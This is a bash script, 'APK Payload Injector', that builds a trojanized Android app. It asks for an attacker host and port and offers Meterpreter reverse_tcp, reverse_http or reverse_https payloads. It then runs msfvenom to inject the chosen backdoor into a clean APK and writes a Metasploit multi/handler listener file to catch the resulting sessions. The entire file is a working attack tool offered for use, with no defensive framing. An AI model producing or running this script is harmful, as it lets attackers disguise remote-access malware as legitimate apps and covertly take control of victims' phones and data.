#!/bin/bash

echo "==============================="
echo "        APK Payload Injector   "
echo "==============================="

# Loop until valid LHOST
while true; do
    read -p "🌐 Enter LHOST: " lhost
    if [ -n "$lhost" ]; then
        break
    else
        echo "[!] LHOST cannot be empty. Please enter a valid IP or hostname."
    fi
done

# Loop until valid LPORT
while true; do
    read -p "🎯 Enter LPORT: " lport
    if [[ "$lport" =~ ^[0-9]+$ ]] && [ "$lport" -ge 1 ] && [ "$lport" -le 65535 ]; then
        break
    else
        echo "[!] LPORT must be a number between 1 and 65535."
    fi
done

# Loop until correct payload choice
while true; do
    echo "Select Payload Type:"
    echo "1) android/meterpreter/reverse_tcp"
    echo "2) android/meterpreter/reverse_http"
    echo "3) android/meterpreter/reverse_https"
    read -p "Enter choice [1-3]: " choice

    case $choice in
        1) payload="android/meterpreter/reverse_tcp"; break ;;
        2) payload="android/meterpreter/reverse_http"; break ;;
        3) payload="android/meterpreter/reverse_https"; break ;;
        *) echo "[!] Invalid choice. Please select 1, 2, or 3." ;;
    esac
done

# Loop to ensure the APK file exists
while true; do
    read -p "Enter the path to a clean APK file: " input_apk
    if [ -f "$input_apk" ]; then
        break
    else
        echo "[!] File not found. Please enter a valid path to an APK file."
    fi
done

# Loop until valid output file name (must end with .apk)
while true; do
    read -p "Enter the output file name (e.g., evil.apk): " output_apk
    if [[ -n "$output_apk" && "$output_apk" == *.apk ]]; then
        break
    else
        echo "[!] Output file name cannot be empty and must end with .apk"
    fi
done

# Generate and inject the payload
echo "[*] Injecting payload ($payload) into $input_apk..."
msfvenom -p $payload LHOST=$lhost LPORT=$lport -x "$input_apk" -o "$output_apk"

# Check if injection was successful
if [ $? -eq 0 ]; then
    echo "[+] Payload injected successfully! Saved as: $output_apk"

    # Create Metasploit resource file
    listener_file="listener.r"
    echo "use exploit/multi/handler" > "$listener_file"
    echo "set payload $payload" >> "$listener_file"
    echo "set LHOST $lhost" >> "$listener_file"
    echo "set LPORT $lport" >> "$listener_file"
    echo "set ExitOnSession false" >> "$listener_file"
    echo "exploit -j" >> "$listener_file"

    echo "[+] Metasploit listener script saved as: $listener_file"
    echo "[*] You can run it using: msfconsole -r $listener_file"

else
    echo "[!] Injection failed. Please check your inputs."
fi